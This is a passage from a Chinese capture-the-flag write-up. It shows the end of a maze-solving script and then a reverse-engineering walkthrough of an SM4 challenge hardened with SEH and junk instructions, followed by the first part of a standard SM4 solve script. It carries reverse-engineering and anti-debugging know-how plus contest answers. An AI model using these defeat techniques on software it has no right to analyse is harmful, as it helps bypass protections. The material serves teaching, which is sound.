end)</span><br><span class="line"></span><br><span class="line">maze = [<span class="number">0x03</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0x09</span>, <span class="number">0x03</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x07</span>, <span class="number">0x0A</span>, <span class="number">0x0F</span>, <span class="number">0x0E</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">0x08</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0x0F</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x0E</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0F</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x08</span>, <span class="number">0x07</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x08</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x09</span>, <span class="number">0x07</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x0F</span>, <span class="number">0x08</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x07</span>, <span class="number">0x0B</span>, <span class="number">0x08</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x06</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x0F</span>, <span class="number">0x09</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x02</span>, <span class="number">0x0F</span>, <span class="number">0x08</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">0x0A</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x07</span>, <span class="number">0x0F</span>, <span class="number">0x0D</span>, <span class="number">0x02</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0x06</span>, <span class="number">0x0D</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x06</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x07</span>, <span class="number">0x0B</span>, <span class="number">0x0E</span>, <span class="number">0x0C</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x06</span>, <span class="number">0x09</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0x0D</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x0B</span>, <span class="number">0x08</span>, <span class="number">0x07</span>, <span class="number">0x0F</span>, <span class="number">0x0F</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x0F</span>, <span class="number">0x08</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x0E</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x03</span>, <span class="number">0x0F</span>, <span class="number">0x09</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0x06</span>, <span class="number">0x09</span>, <span class="number">0x03</span>, <span class="number">0x0D</span>, <span class="number">0x17</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x0A</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x0B</span>, <span class="number">0x08</span>, <span class="number">0x07</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0D</span>, <span class="number">0x06</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x0F</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0x02</span>, <span class="number">0x0E</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0x0E</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0x0C</span>]</span><br><span class="line">a = <span class="number">18</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(maze)):</span><br><span class="line">    <span class="keyword">if</span> maze[i] &amp; <span class="number">0x10</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">end = (i//a, i%a)</span><br><span class="line">maze = <span class="built_in">list</span>(<span class="built_in">zip</span>(*[<span class="built_in">iter</span>(maze)] * a))</span><br><span class="line">flag = <span class="string">&quot;hsctf&#123;&quot;</span> + walkMaze(maze, a, (<span class="number">1</span>, <span class="number">1</span>), end) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2022SlothTrial/image-20220511090353696.png"></p><p>（其实还有个revenge版的，这次没人做出3ZVW就没放，留到下一场比赛啦~</p><h2 id="5rn4"><a href="#5rn4" class="headerlink" title="5rn4"></a>5rn4</h2><p>题外话，对国密熟悉的朋友们应该会知道描述指的是SM4（后来hint也给了）。</p><p><del>因为选拔赛难度，想着用来防AK</del>所以加了个SEH（结构化异常处理）+花指令，果然防住了呢（。</p><p>花指令的说明见<a href="https://c10udlnk.top/p/reSkillsOn-ALLaboutJunkCode/">RE套路 - 关于逆向常客花指令 | c10udlnk_Log</a>。这里是有点考汇编功底的（我错了，下次还敢</p><p>从没办法解析到的汇编往上看，可以看到<code>inc edi</code>这条是不太正常的。</p><p><img src="/p/wpFor-2022SlothTrial/image-20220511091848410.png"></p><p>edi只在前面存了一个栈上的地址，这边自增的话就错位了（当然也不排除这种可能。最不正常的应该是再下一句<code>inc ebp</code>，ebp存着栈底地址，理论上是不能动的。</p><p><img src="/p/wpFor-2022SlothTrial/image-20220511092114381.png"></p><p>可以把这部分试一下怎么拆分能把剩下的全部转成可读代码，然后把没用的花指令patch掉，也可以用动态调试发现接下来应该走的代码（不过这里有很多次循环SEH，用于反调试，比较阴间）。</p><p><img src="/p/wpFor-2022SlothTrial/image-20220511093025002.png"></p><p>然后把这个0xff给nop掉再整个转函数就可以生成反编译代码了。</p><p><img src="/p/wpFor-2022SlothTrial/image-20220511093129252.png"></p><p>sub_9F1032可以猜到是printf，sub_9F1262猜是scanf。</p><p>实际上就是一个sm4的实现（可以对比SM4的实现，如果看不出来就对比源码参考链接<a href="https://blog.csdn.net/weixin_42700740/article/details/102667012%EF%BC%89%EF%BC%8C%E5%AF%86%E9%92%A5%E6%98%AF%60746573746f766572%60%EF%BC%8C%E5%AF%86%E6%96%87%E5%9C%A8byte_9FB000%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%AF%B4%E6%98%AF%E4%B8%80%E4%B8%AA%E5%AF%86%E7%A0%81%E9%A2%98%E6%9E%81%E7%AE%80%E6%A8%A1%E6%9D%BF%E3%80%82">https://blog.csdn.net/weixin_42700740/article/details/102667012），密钥是`746573746f766572`，密文在byte_9FB000，可以说是一个密码题极简模板。</a></p><p>就是有一个魔改密文被藏在异常处理里了：</p><p><img src="/p/wpFor-2022SlothTrial/image-20220511094050784.png"></p><p><img src="/p/wpFor-2022SlothTrial/image-20220511094113010.png"></p><p>也可以看交叉引用发现（如果想到出题人这么阴间的话）</p><p>所以写exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sm4 code from https://blog.csdn.net/weixin_42700740/article/details/102667012</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************定义系统参数FK的取值****************************************/</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> TBL_SYS_PARAMS[<span class="number">4</span>] = &#123;</span><br><span class="line">    <span class="number">0xa3b1bac6</span>,</span><br><span class="line">    <span class="number">0x56aa3350</span>,</span><br><span class="line">    <span class="number">0x677d9197</span>,</span><br><span class="line">    <span class="number">0xb27022dc</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************定义固定参数CK的取值****************************************/</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> TBL_FIX_PARAMS[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0x00070e15</span>,<span class="number">0x1c232a31</span>,<span class="number">0x383f464d</span>,<span class="number">0x545b6269</span>,</span><br><span class="line">    <span class="number">0x70777e85</span>,<span class="number">0x8c939aa1</span>,<span class="number">0xa8afb6bd</span>,<span class="number">0xc4cbd2d9</span>,</span><br><span class="line">    <span class="number">0xe0e7eef5</span>,<span class="number">0xfc030a11</span>,<span class="number">0x181f262d</span>,<span class="number">0x343b4249</span>,</span><br><span class="line">    <span class="number">0x50575e65</span>,<span class="number">0x6c737a81</span>,<span class="number">0x888f969d</span>,<span class="number">0xa4abb2b9</span>,</span><br><span class="line">    <span class="number">0xc0c7ced5</span>,<span class="number">0xdce3eaf1</span>,<span class="number">0xf8ff060d</span>,<span class="number">0x141b2229</span>,</span><br><span class="line">    <span class="number">0x30373e45</span>,<span class="number">0x4c535a61</span>,<span class="number">0x686f767d</span>,<span class="number">0x848b9299</span>,</span><br><span class="line">    <span class="number">0xa0a7aeb5</span>,<span class="number">0xbcc3cad1</span>,<span class="number">0xd8dfe6ed</span>,<span class="number">0xf4fb0209</span>,</span><br><span class="line">    <span class="number">0x10171e25</span>,<span class="number">0x2c333a41</span>,<span class="number">0x484f565d</span>,<span class="number">0x646b7279</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******************************SBox参数列表****************************************/</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> TBL_SBOX[<span class="number">256</span>] = &#123;</span><br><span class="line">    <span class="number">0xd6</span>,<span class="number">0x90</span>,<span class="number">0xe9</span>,<span class="number">0xfe</span>,<span class="number">0xcc</span>,<span class="number">0xe1</span>,<span class="number">0x3d</span>,<span class="number">0xb7</span>,<span class="number">0x16</span>,<span class="number">0xb6</span>,<span class="number">0x14</span>,<span class="number">0xc2</span>,<span class="number">0x28</span>,<span class="number">0xfb</span>,<span class="number">0x2c</span>,<span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x2b</span>,<span class="number">0x67</span>,<span class="number">0x9a</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0xbe</span>,<span class="number">0x04</span>,<span class="number">0xc3</span>,<span class="number">0xaa</span>,<span class="number">0x44</span>,<span class="number">0x13</span>,<span class="number">0x26</span>,<span class="number">0x49</span>,<span class="number">0x86</span>,<span class="number">0x06</span>,<span class="number">0x99</span>,</span><br><span class="line">    <span class="number">0x9c</span>,<span class="number">0x42</span>,<span class="number">0x50</span>,<span class="number">0xf4</span>,<span class="number">0x91</span>,<span class="number">0xef</span>,<span class="number">0x98</span>,<span class="number">0x7a</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x0b</span>,<span class="number">0x43</span>,<span class="number">0xed</span>,<span class="number">0xcf</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0xe4</span>,<span class="number">0xb3</span>,<span class="number">0x1c</span>,<span class="number">0xa9</span>,<span class="number">0xc9</span>,<span class="number">0x08</span>,<span class="number">0xe8</span>,<span class="number">0x95</span>,<span class="number">0x80</span>,<span class="number">0xdf</span>,<span class="number">0x94</span>,<span class="number">0xfa</span>,<span class="number">0x75</span>,<span class="number">0x8f</span>,<span class="number">0x3f</span>,<span class="number">0xa6</span>,</span><br><span class="line">    <span class="number">0x47</span>,<span class="number">0x07</span>,<span class="number">0xa7</span>,<span class="number">0xfc</span>,<span class="number">0xf3</span>,<span class="number">0x73</span>,<span class="number">0x17</span>,<span class="number">0xba</span>,<span class="number">0x83</span>,<span class="number">0x59</span>,<span class="number">0x3c</span>,<span class="number">0x19</span>,<span class="number">0xe6</span>,<span class="number">0x85</span>,<span class="number">0x4f</span>,<span class="number">0xa8</span>,</span><br><span class="line">    <span class="number">0x68</span>,<span class="number">0x6b</span>,<span class="number">0x81</span>,<span class="number">0xb2</span>,<span class="number">0x71</span>,<span class="number">0x64</span>,<span class="number">0xda</span>,<span class="number">0x8b</span>,<span class="number">0xf8</span>,<span class="number">0xeb</span>,<span class="number">0x0f</span>,<span class="number">0x4b</span>,<span class="number">0x70</span>,<span class="number">0x56</span>,<span class="number">0x9d</span>,<span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x1e</span>,<span class="number">0x24</span>,<span class="number">0x0e</span>,<span class="number">0x5e</span>,<span class="number">0x63</span>,<span class="number">0x58</span>,<span class="number">0xd1</span>,<span class="number">0xa2</span>,<span class="number">0x25</span>,<span class="number">0x22</span>,<span class="number">0x7c</span>,<span class="number">0x3b</span>,<span class="number">0x01</span>,<span class="number">0x21</span>,<span class="number">0x78</span>,<span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0xd4</span>,<span class="number">0x00</span>,<span class="number">0x46</span>,<span class="number">0x57</span>,<span class="number">0x9f</span>,<span class="number">0xd3</span>,<span class="number">0x27</span>,<span class="number">0x52</span>,<span class="number">0x4c</span>,<span class="number">0x36</span>,<span class="number">0x02</span>,<span class="number">0xe7</span>,<span class="number">0xa0</span>,<span class="number">0xc4</span>,<span class="number">0xc8</span>,<span class="number">0x9e</span>,</span><br><span class="line">    <span class="number">0xea</span>,<span class="number">0xbf</span>,<span class="number">0x8a</span>,<span class="number">0xd2</span>,<span class="number">0x40</span>,<span class="number">0xc7</span>,<span class="number">0x38</span>,<span class="number">0xb5</span>,<span class="number">0xa3</span>,<span class="number">0xf7</span>,<span class="number">0xf2</span>,<span class="number">0xce</span>,<span class="number">0xf9</span>,<span class="number">0x61</span>,<span class="number">0x15</span>,<span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0xe0</span>,<span class="number">0xae</span>,<span class="number">0x5d</span>,<span class="number">0xa4</span>,<span class="number">0x9b</span>,<span class="number">0x34</span>,<span class="number">0x1a</span>,<span class="number">0x55</span>,<span class="number">0xad</span>,<span class="number">0x93</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0xf5</span>,<span class="number">0x8c</span>,<span class="number">0xb1</span>,<span class="number">0xe3</span>,</span><br><span class="line">    <span class="number">0x1d</span>,<span class="number">0xf6</span>,<span class="number">0xe2</span>,<span class="number">0x2e</span>,<span class="number">0x82</span>,<span class="number">0x66</span>,<span class="number">0xca</span>,<span class="number">0x60</span>,<span class="number">0xc0</span>,<span class="number">0x29</span>,<span class="number">0x23</span>,<span class="number">0xab</span>,<span class="number">0x0d</span>,<span class="number">0x53</span>,<span class="number">0x4e</span>,<span class="number">0x6f</span>,</span><br><span class="line">    <span class="number">0xd5</span>,<span class="number">0xdb</span>,<span class="number">0x37</span>,<span class="number">0x45</span>,<span class="number">0xde</span>,<span class="number">0xfd</span>,<span class="number">0x8e</span>,<span class="number">0x2f</span>,<span class="number">0x03</span>,<span class="number">0xff</span>,<span class="number">0x6a</span>,<span class="number">0x72</span>,<span class="number">0x6d</span>,<span class="number">0x6c</span>,<span class="number">0x5b</span>,<span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x8d</span>,<span class="number">0x1b</span>,<span class="number">0xaf</span>,<span class="number">0x92</span>,<span class="number">0xbb</span>,<span class="number">0xdd</span>,<span class="number">0xbc</span>,<span class="number">0x7f</span>,<span class="number">0x11</span>,<span class="number">0xd9</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x1f</span>,<span class="number">0x10</span>,<span class="number">0x5a</span>,<span class="number">0xd8</span>,</span><br><span class="line">    <span class="number">0x0a</span>,<span class="number">0xc1</span>,<span class="number">0x31</span>,<span class="number">0x88</span>,<span class="number">0xa5</span>,<span class="number">0xcd</span>,<span class="number">0x7b</span>,<span class="number">0xbd</span>,<span class="number">0x2d</span>,<span class="number">0x74</span>,<span class="number">0xd0</span>,<span class="number">0x12</span>,<span class="number">0xb8</span>,<span class="number">0xe5</span>,<span class="number">0xb4</span>,<span class="number">0xb0</span>,</span><br><span class="line">    <span class="number">0x89</span>,<span class="number">0x69</span>,<span class="number">0x97</span>,<span class="number">0x4a</span>,<span class="number">0x0c</span>,<span class="number">0x96</span>,<span class="number">0x77</span>,<span class="number">0x7e</span>,<span class="number">0x65</span>,<span class="number">0xb9</span>,<span class="number">0xf1</span>,<span class="number">0x09</span>,<span class="number">0xc5</span>,<span class="number">0x6e</span>,<span class="number">0xc6</span>,<span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>,<span class="number">0xf0</span>,<span class="number">0x7d</span>,<span class="number">0xec</span>,<span class="number">0x3a</span>,<span class="number">0xdc</span>,<span class="number">0x4d</span>,<span class="number">0x20</span>,<span class="number">0x79</span>,<span class="number">0xee</span>,<span class="number">0x5f</span>,<span class="number">0x3e</span>,<span class="number">0xd7</span>,<span class="number">0xcb</span>,<span class="number">0x39</span>,<span class="number">0x48</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4字节无符号数组转无符号long型</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">four_uCh2uLong</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* in, <span class="keyword">unsigned</span> <span class="keyword">long</span>* out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    *out = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">        *out = ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)in[i] &lt;&lt; (<span class="number">24</span> - i * <span class="number">8</span>)) ^ *out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无符号long型转4字节无符号数组</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uLong2four_uCh</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> in, <span class="keyword">unsigned</span> <span class="keyword">char</span>* out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//从32位unsigned long的高位开始取</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">        *(out + i) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(in &gt;&gt; (<span class="number">24</span> - i * <span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//左移，保留丢弃位放置尾部</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">move</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> data, <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> result = <span class="number">0</span>;</span><br><span class="line">    result = (data &lt;&lt; length) ^ (data &gt;&gt; (<span class="number">32</span> - length));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//秘钥处理函数,先使用Sbox进行非线性变化，再将线性变换L置换为L&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">func_key</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ulTmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ucIndexList[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ucSboxValueList[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    uLong2four_uCh(input, ucIndexList);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ucSboxValueList[i] = TBL_SBOX[ucIndexList[i]];</span><br><span class="line">    &#125;</span><br><span class="line">    four_uCh2uLong(ucSboxValueList, &amp;ulTmp);</span><br><span class="line">    ulTmp = ulTmp ^ move(ulTmp, <span class="number">13</span>) ^ move(ulTmp, <span class="number">23</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ulTmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加解密数据处理函数,先使用Sbox进行非线性变化，再进行线性变换L</span></span><br><span class="line"><span class="function"><span 